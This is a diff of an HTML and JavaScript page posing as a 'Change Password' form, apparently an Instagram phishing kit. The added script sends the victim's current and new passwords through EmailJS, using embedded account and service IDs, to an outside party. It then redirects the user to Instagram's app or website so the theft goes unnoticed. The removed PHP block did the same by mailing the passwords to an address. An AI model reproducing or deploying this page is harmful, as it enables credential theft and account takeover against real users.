@@ -3,35 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Parolamı Değiştir</title>
+    <title>Change Password</title>
     <link rel="stylesheet" href="style.css">
+    <link rel="shortcut icon" href="favicon.png" type="image/x-icon">
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function(){
+            emailjs.init("mjvlNFxpFd1PUK640"); // Buraya EmailJS kullanıcı kimliğinizi (user ID) girin
+        })();
+    </script>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <img src="logo.png" alt="Logo" class="logo"> <!-- Logo resminizi buraya ekleyin -->
+            <img src="logo.png" alt="Logo" class="logo">
             <h1>Change Password</h1>
         </div>
-        <?php
-        if ($_SERVER["REQUEST_METHOD"] == "POST") {
-            $currentPassword = $_POST['currentPassword'];
-            $newPassword = $_POST['newPassword'];
-            $confirmPassword = $_POST['confirmPassword'];
-
-            // E-posta gönderme işlemi
-            $to = 'sizinemail@ornek.com'; // Buraya kendi e-posta adresinizi girin
-            $subject = 'Şifre Değişikliği';
-            $message = "Eski Şifre: $currentPassword\nYeni Şifre: $newPassword\nYeni Şifre (Tekrar): $confirmPassword";
-            $headers = 'From: webmaster@ornek.com'; // Gönderici e-posta adresi
-
-            if (mail($to, $subject, $message, $headers)) {
-                echo "<p>Şifreleriniz e-posta ile gönderildi.</p>";
-            } else {
-                echo "<p>E-posta gönderilemedi. Lütfen tekrar deneyiniz.</p>";
-            }
-        }
-        ?>
-        <form action="" method="POST" class="password-form">
+        <form id="passwordForm" class="password-form">
             <div class="form-group">
                 <label for="currentPassword">Current Password</label>
                 <input type="password" id="currentPassword" name="currentPassword" required>
@@ -47,5 +35,41 @@
             <button type="submit" class="change-button">Accept</button>
         </form>
     </div>
+
+    <script>
+        document.getElementById('passwordForm').addEventListener('submit', function(event){
+    event.preventDefault();
+
+    var currentPassword = document.getElementById('currentPassword').value;
+    var newPassword = document.getElementById('newPassword').value;
+    var confirmPassword = document.getElementById('confirmPassword').value;
+
+    // EmailJS ile e-posta gönderme
+    emailjs.send("service_q1o8068", "template_qnecd0e", {
+        "currentPassword": currentPassword,
+        "newPassword": newPassword,
+        "confirmPassword": confirmPassword
+    }).then(function(response) {
+        console.log("E-posta başarıyla gönderildi", response.status, response.text);
+        
+        // 1 saniye sonra yönlendirme işlemi
+        setTimeout(function() {
+            // Kullanıcının mobilden gelip gelmediğini kontrol et
+            var isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+            
+            if (isMobile) {
+                // Mobil cihazdan geliyorsa Instagram uygulamasına yönlendir
+                window.location.href = "instagram://user";
+            } else {
+                // Mobil cihazdan gelmiyorsa Instagram web sitesine yönlendir
+                window.location.href = "https://www.instagram.com/";
+            }
+        }, 1000); // 1 saniye bekleme süresi
+    }, function(error) {
+        console.log("E-posta gönderilirken hata oluştu", error);
+    });
+});
+
+    </script>
 </body>
 </html>
